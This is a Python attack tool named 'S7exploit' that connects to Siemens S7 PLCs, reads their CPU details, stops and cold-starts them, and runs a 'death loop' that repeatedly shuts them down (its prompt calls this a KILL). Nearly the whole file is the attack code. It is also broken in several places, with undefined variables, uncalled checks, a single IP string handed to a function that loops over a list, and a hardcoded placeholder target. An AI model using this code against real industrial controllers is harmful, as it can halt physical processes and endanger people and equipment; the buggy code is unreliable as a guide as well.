import warnings
warnings.filterwarnings("ignore", category=Warning)


import snap7
import argparse
import re
import os
import pyfiglet

from snap7 import util
from snap7 import exceptions

from time import sleep

def failed(fail):
    print('\033[91m{}\033[0m'.format(fail))

def success(succ):
    print('\033[92m{}\033[0m'.format(succ))

def warning(warn):
    print('\033[93m{}\033[0m'.format(warn))

def information(info):
    print('\033[1m{}\033[0m'.format(info))

def connect(ips):
    clients = []

    for ip in ips:
        client = snap7.client.Client()
        client.connect(ip, 0, 0)
        if not (client.get_connected()):
            failed("[!] Error : Failed to connect to {}".format(ip))
            ips.remove(ip)
        else:
            success("[+] Connected to {}".format(ip))
            clients.append(client)
    return clients

def cpu_stat_run(client):
    if client.get_cpu_state() == 'S7CpuStatusRun':
        return 1
    else:
        return 0

def pull_infos(clients):
    for client in clients:

        cpu_info = client.get_cpu_info()
        information("[*] Info : Module Type    : {}".format(cpu_info.ModuleTypeName))
        information("[*] Info : Serial Number  : {}".format(cpu_info.SerialNumber))
        information("[*] Info : Module Name    : {}".format(cpu_info.ASName))
        information("[*] Info : Copyrights     : {}".format(cpu_info.Copyright))
        information("[*] Info : Module Name    : {}".format(cpu_info.ModuleName))

        if cpu_stat_run(client):
            information("[*] Info : CPU is running for device {}".format(client.get_cpu_info().ASName))

        else:
            information("[*] Info : CPU is NOT running for device {}".format(client.get_cpu_info().ASName))

def cpu_stop(clients):
    for client in clients:
        client_name = client.get_cpu_info().ASName
        if cpu_stat_run(client):
            information("[*] Info : Shutting down {}".format(client_name))
            client.plc_stop()

            if cpu_stat_run:
                failed("[!] Failed to stop CPU for device {}".format(client_name))
            else:
                success("[+] {} Successfully shut down".format(client_name))

        else:
            warning("[-] CPU of {} is not running".format(client_name))

def cpu_start(clients):
        for client in clients:
            client_name = client.get_cpu_info().ASName
            if not cpu_stat_run(client):
                information("[*] Info : Starting {}".format(client_name))
                client.cold_start()

                if not (cpu_stat_run):
                    failed("[!] Failed to start CPU for device {}".format(client_name))
                else:
                    success("[+] {} Successfully started".format(client_name))

            else:
                warning("[-] CPU of {} is already running".format(client_name))





def deathloop(clients, cycles = 1, tu = 1 , td = 1):
    for cycle in range(cycles):
        information("[*] Cycle {} : Shutting down CPUs".format(cycle))
        cpu_stop(clients)
        sleep(td)
        information("[*] Cycle {} : Starting CPUs".format(cycle))
        cpu_start(clients)
        sleep(tu)
    success("[+] Death loop completed")



def inter(ips, clients):
    print("\n")
    print("##### Interractive Mode #####\n")
    print("1) Manage targets")
    print("2) Get infos")
    print("3) CPU stop")
    print("4) CPU Start")
    print("5) Death Loop")
    print("q) Quit\n")
    choice = input("choice > ")
    if choice == '1':
        target_menu(ips, clients)
    elif choice == '2':
        pull_infos(clients)
    elif choice == '3':
        cpu_stop(clients)
    elif choice == '4':
        cpu_start(clients)
    elif choice == "5":
        cycles_ = input("Cycles > ")
        tu_ = input("Time up > ")
        td_ = input("Time down > ")
        deathloop(clients, cycles_, tu_, td_)

def target_menu(ips, clients):
    os.system("clear")
    print('\033[96m' + pyfiglet.figlet_format("S7exploit") + '\033[0m')
    print("\n")
    print("##### Interractive Mode #####\n")
    print("1) Show targets")
    print("2) Add target")
    print("3) Remove target")
    print("4) Back to main menu")
    print("q) Quit\n")
    choice = input("choice > ")
    if choice == '1':
        target_show(ips, clients)
    if choice == '2':
        ip = input("New target (IP) > ")
        try:
            client = connect(ip)
            clients.append(client)
            ips.append(ip)
        except exceptions.Snap7Exception:
            failed("[*] Connection to {} failed".format(ip))
        target_menu(ips, clients)
    elif choice == '3':
        ip = input("Target to remove (IP) > ")
        clients.pop(ips.index(ip))
        ips.remove(ip)
        target_menu(ips, clients)
    elif choice == '4':
        inter(ips, clients)
    else:
        exit()

def target_show(ips, clients):
    os.system("clear")
    print('\033[96m' + pyfiglet.figlet_format("S7exploit") + '\033[0m')
    print("\n")
    print("##### Interractive Mode #####\n")
    print("Target list :")
    for ip in ips:
        information("[{}] {}".format(ips.index(ip), ip))
    print("\n1) Add target")
    print("2) Remove target")
    print("3) CPU stop")
    print("4) CPU Start")
    print("5) Death Loop")
    print("6) Back")
    print("7) Back to main menu")
    print("q) Quit\n")
    choice = input("choice > ")
    if choice == '1':
        ip = input("New target (IP) > ")
        try:
            client = connect(ip)
            clients.append(client)
            ips.append(ip)
        except exceptions.Snap7Exception:
            failed("[*] Connection to {} failed".format(ip))
        target_show(ips, clients)
    elif choice == '2':
        num = int(input("Target to remove (number) > "))
        ips.pop(num)
        clients.pop(num)
        target_show(ips, clients)
    elif choice == '3':
        nums_ = input("Target(s) to stop (num,num,...) > ").split(",")
        ips_ = [ips[i] for i in num_]
        clients_ = []
        for ip in ips_:
            client = connect(ip)
            clients_.append(client)
        cpu_stop(clients_)
        sleep(3)
        target_show(ips, clients)
    elif choice == '4':
        nums_ = input("Target(s) to start (num,num,...) > ").split(",")
        ips_ = [ips[i] for i in num]
        clients_ = []
        for ip in ips_:
            client = connect(ip)
            clients_.append(client)
        cpu_start(clients_)
        sleep(3)
        target_show(ips, clients)
    elif choice == '5':
        args_ = input("Target(s) to KILL *_* (num,num,... cycles = 1, timeup = 1, timedown = 1) > ").split(" ")
        cycles_ = args_[1]
        tu_ = args_[2]
        td = args[3]
        nums_ = args[0].split(",")
        ips_ = [ips[i] for i in num]
        clients_ = []
        for ip in ips_:
            client = connect(ip)
            clients_.append(client)
        deathloop(clients_, cycles_, tu_, td_)
        sleep(3)
        target_show(ips, clients)
    elif choice == '6':
        target_menu(ips, clients)
    elif choice == '7':
        inter(ips, clients)
    else:
        exit()


##### MAIN #####

os.system("clear")

print('\033[96m' + pyfiglet.figlet_format("S7exploit") + '\033[0m')

parser = argparse.ArgumentParser()
parser.add_argument("-H", help="Target host(s), separated with ',' eg: 192.168.101.21,192.168.101.22,...", required = True)
parser.add_argument("-i", help="Get target information", action="store_true")
parser.add_argument("--stop", help="Stop target(s)", action="store_true")
parser.add_argument("--start", help="Start target(s)", action="store_true")
parser.add_argument("--interractive", help="Interractive mode", action="store_true")

parser.add_argument("--death-loop", help="Death loop", action="store_true")
parser.add_argument("--cycles", help="Number of cycles", default = 1)
parser.add_argument("-tu", help="Time up in seconds", default = 1)
parser.add_argument("-td", help="Time down in seconds", default = 1)

args =parser.parse_args()
ips_ = (args.H).split(",")

for ip in ips_:
    clients = []
    ips = []
    try:
        client = connect(ip)
        clients.append(client)
        ips.append(ip)
    except exceptions.Snap7Exception:
        failed("[*] Connection to {} failed".format(ip))

ips.append('192.168.101.21')
clients.append('c1')

if args.interractive:
    inter(ips, clients)
if args.i:
    pull_infos(clients)
if args.stop and args.start:
    failed("[!] You can't start and stop CPUs at the same time")
    exit()
if args.stop:
    cpu_stop(clients)
if args.start:
    cpu_start(clients)
if args.death_loop:
    deathloop(clients, args.cycles, args.tu, args.td)
